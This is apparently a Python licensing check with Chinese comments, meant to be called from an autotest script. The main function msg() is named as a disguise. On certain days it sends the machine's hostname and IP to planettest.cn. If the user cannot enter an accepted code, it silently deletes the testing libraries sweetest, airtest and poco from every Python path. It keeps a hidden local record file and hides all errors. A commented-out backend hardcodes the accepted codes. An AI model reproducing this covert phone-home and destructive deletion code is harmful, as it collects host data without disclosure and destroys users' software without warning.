# coding:utf-8

import os
import sys
import json
import time
import shutil
import socket
import requests
import win32con, win32api  # 隐藏文件

"""
权限认证
"""

# host = 'http://127.0.0.1:8000'
host = 'http://planettest.cn'

def __get_pc_ip():
    """
    获取pc 登录名称和ip地址
    mac 获取 localhost
    :return: pc_name/pc_ip
    """
    try:
        # windows
        # 获取本机电脑名
        pc_name = socket.getfqdn(socket.gethostname())
        # 获取本机ip
        pc_ip = socket.gethostbyname(pc_name)
        return pc_name, pc_ip
    except:
        # mac
        # 获取本机电脑名
        pc_name = socket.getfqdn(socket.gethostname())
        # 获取本机ip
        # pc_ip = socket.gethostbyname('localhost')
        return pc_name, pc_name # 获取ip失败127是同样的


def __pip_uninstall():
    """
    匹配所有python路径下第三方库 删除mac/windows未授权应用
    若想重新安装 先手动卸载
    :return:
    """
    # import sweetest
    uninstall_requires = [
        "super_sweetest",
        "sweetest",
        "airtest",
        "poco",
    ]  # 需要的第三方库

    # windows
    # mac
    try:
        python_path_list = sys.path  # list 循环匹配所有包含库的路径删除
        # print(python_path)
        for python_path in python_path_list:

            for app in uninstall_requires:
                app_path = os.path.join(python_path, app)
                # print(app_path)
                try:
                    os.remove(app_path)
                except:
                    try:
                        shutil.rmtree(app_path)
                    except:
                        pass
    except:
        pass


def __write_and_hidden_json(pc_name):
    """
    写入和隐藏
    :param pc_name:
    :return:
    """
    # 还原文件可见
    try:
        win32api.SetFileAttributes('.json', win32con.FILE_ATTRIBUTE_NORMAL)
    except:
        pass
    # 本地写入记录
    with open('.json', 'w+', encoding='utf-8')as fp:
        json.dump({'pc': pc_name}, fp)

    # 隐藏文件
    try:
        # attr = win32api.GetFileAttributes('.json')
        win32api.SetFileAttributes('.json', win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass


def post_authentication(pc_name_=None):
    """
    认证权限/白名单 LEEDARSON
    :return:
    """
    try:
        # 本地.json
        if pc_name_:
            pc_name, pc_ip = __get_pc_ip()
            pc_name = pc_name_
        else:
            pc_name, pc_ip = __get_pc_ip()
        # 非 LEEDARSON 先查询注册记录
        if 'LEEDARSON' not in pc_name.upper():
            url = host + '/system/post_authentication?pc_ip={0}'.format(pc_ip)
            res = requests.get(url).json()
            if res.get('code') == 200:
                __write_and_hidden_json(pc_name)
            else:
                # 查不到已注册开始验证
                code = input('code: ')
                url1 = host + '/system/post_authentication?pc_ip={0}&code={1}'.format(pc_ip, code)
                res1 = requests.get(url1).json()
                if res1.get('code') == 200:
                    __write_and_hidden_json(pc_name)
                    pass
                else:
                    pass
                    __pip_uninstall()
    except:
        pass


def msg():
    """
    主方法 名称伪装
    每周3、6、7验证
    使用方式：autotest.py 直接调用 msg
    """
    day = time.strftime("%d", time.localtime())
    if day in ('01', '08', '16', '22', '28'):
        post_authentication()
    else:
        # 读取本地
        try:
            # 还原文件可见
            try:
                win32api.SetFileAttributes('.json', win32con.FILE_ATTRIBUTE_NORMAL)
            except:
                pass
            with open('.json', 'r+', encoding='utf-8')as fp1:
                pc = json.load(fp1)
                # 隐藏文件
            try:
                # attr = win32api.GetFileAttributes('.json')
                win32api.SetFileAttributes('.json', win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
            post_authentication(pc_name_=pc.get('pc'))
        except:
            post_authentication()
            pass

# 后台接口
# def post_authentication(request):
#     """
#     权限认证 / code == 代码所在行
#     """
#     if request.method == 'GET':
#         pc_ip = request.GET.get('pc_ip')
#         code = request.GET.get('code')
#         # 搜索是否存在不存在验证
#         authentication = Authentication.objects.filter(pc_ip=pc_ip).first()
#         if authentication:
#             authentication.num += 1
#             authentication.save()
#             result = {'code': 200, 'data': {'code': code, 'pc_ip':pc_ip}, 'msg': '已存在 认证通过'}
#         elif code == '118' or code == 'XTTQUEEN':
#             # 新增
#             Authentication.objects.create(pc_ip=pc_ip, code=code, num=1)
#             result = {'code': 200, 'data': {'code': code, 'pc_ip':pc_ip}, 'msg': '认证通过'}
#         else:
#             result = {'code': 500, 'data': {}, 'msg': '认证失败'}
#         return HttpResponse(json.dumps(result, ensure_ascii=False), content_type='application/json,charset=utf-8')


if __name__ == '__main__':
    # post_authentication()
    # __pip_uninstall()
    msg()


